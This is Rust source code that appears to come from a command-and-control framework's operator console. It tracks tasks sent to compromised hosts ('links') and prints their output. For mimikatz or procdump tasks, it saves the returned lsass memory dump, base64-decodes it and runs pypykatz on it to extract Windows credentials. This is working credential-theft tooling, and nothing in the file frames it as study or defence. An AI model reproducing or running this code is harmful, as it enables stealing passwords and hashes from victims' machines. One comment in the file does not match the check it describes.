use std::io::{StdoutLock, Write};
use std::fs;

#[derive(Debug, Default)]
pub struct Tasks {
    pub tasks: Vec<Task>,
}

#[derive(Debug)]
pub struct Task {
    pub id: uuid::Uuid,
    pub command: String,
    pub cli_command: String,
    pub status: TaskStatus,
    pub output: String,
}

#[derive(Debug, PartialEq)]
pub enum TaskStatus {
    Waiting,
    InProgress,
    Completed,
}

// command help struct
pub struct Command {
    pub name: String,
    pub help: String,
}

// print new link to stdout
pub fn write_link_to_stdout(cli_handle: &mut StdoutLock, link_name: String) {
    let output = format!("\n\n🔗 New link: {} 🔗\n", link_name,);
    let _ = cli_handle.write_all(output.as_bytes()).unwrap();
}

// print returned task output to stdout
pub fn write_task_to_stdout(
    cli_handle: &mut StdoutLock,
    link_name: String,
    task_id: String,
    task_command: String,
    returned_data: &str,
) {
	let output: String;
    // check if mimikatz was executed
    if task_command == "mimikatz 0".to_string() || task_command == "procdump 0".to_string() {
		let pypykatz_output = write_dump_exec_pypykatz(task_id.clone(), returned_data);
		output = format!(
			"\n\nLink: {}\nTask ID: {}\nCommand: {}\nOutput:\n\n{}\n",
			link_name, task_id, task_command, pypykatz_output,
		);
    } else {
		output = format!(
			"\n\nLink: {}\nTask ID: {}\nCommand: {}\nOutput:\n\n{}\n",
			link_name, task_id, task_command, returned_data,
		);
	}
    let _ = cli_handle.write_all(output.as_bytes()).unwrap();
}

pub fn write_dump_exec_pypykatz(task_id: String, returned_data: &str) -> String {
	let home_dir = match std::env::var("HOME") {
		Err(e) => {
			println!("{}", e);
			return returned_data.to_string()
		}
		Ok(home) => home,
	};
	let prev_dir_path = std::env::current_dir().unwrap();
	let link_dumps_path = &format!("{}/.link/dumps", home_dir);
	// create directory and change dir
	match fs::create_dir_all(link_dumps_path) {
		Err(e) => {
			println!("{}", e);
			return returned_data.to_string()
		}
		Ok(link_dir) => link_dir,
	};
	if std::env::set_current_dir(link_dumps_path).is_err() {
		println!("could not change directory");
		return returned_data.to_string()
	}
	// write lsass.exe MiniDump to file
	let dump_name = format!("{}-dump", task_id);
	let dump_name_b64 = format!("{}.b64", dump_name.clone());
	let dump_name_bin = format!("{}.bin", dump_name.clone());
	let mut output_file = fs::File::create(&dump_name_b64.clone()).expect("could not write file");
	output_file.write_all(returned_data.as_bytes()).expect("could not write contents to dump file");
	// base64 decode and execute pypykatz on dump file
	let mut output = std::process::Command::new("base64")
		.args(&["-di", &dump_name_b64])
		.output();
	match output {
		Err(_) => {
			// return to previous path
			if std::env::set_current_dir(prev_dir_path).is_err() {
				println!("could not change directory");
			}
			return returned_data.to_string()
		},
		Ok(dump) => {
			output_file = fs::File::create(&dump_name_bin.clone()).expect("could not write file");
			output_file.write_all(&dump.stdout).expect("could not write contents to dump file");
		},
	}
	// check if cargo exists if not prompt for install
    if std::process::Command::new("pypykatz")
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .is_err()
    {
        println!("pypykatz not installed, the following command may help:");
        println!("pip3 install pypykatz");
        return returned_data.to_string()
    }
	output = std::process::Command::new("pypykatz")
		.args(&["lsa", "minidump", &dump_name_bin])
		.output();
	match output {
		Err(_) => {
			// return to previous path
			if std::env::set_current_dir(prev_dir_path).is_err() {
				println!("could not change directory");
			}
			return returned_data.to_string()
		},
		Ok(_) => {},
	}
	let dump = output.unwrap();
	// return to previous path
	if std::env::set_current_dir(prev_dir_path).is_err() {
		println!("could not change directory");
		return returned_data.to_string()
	}

	let pypykatz_output = std::str::from_utf8(&dump.stdout).unwrap();

	return pypykatz_output.to_string()
}

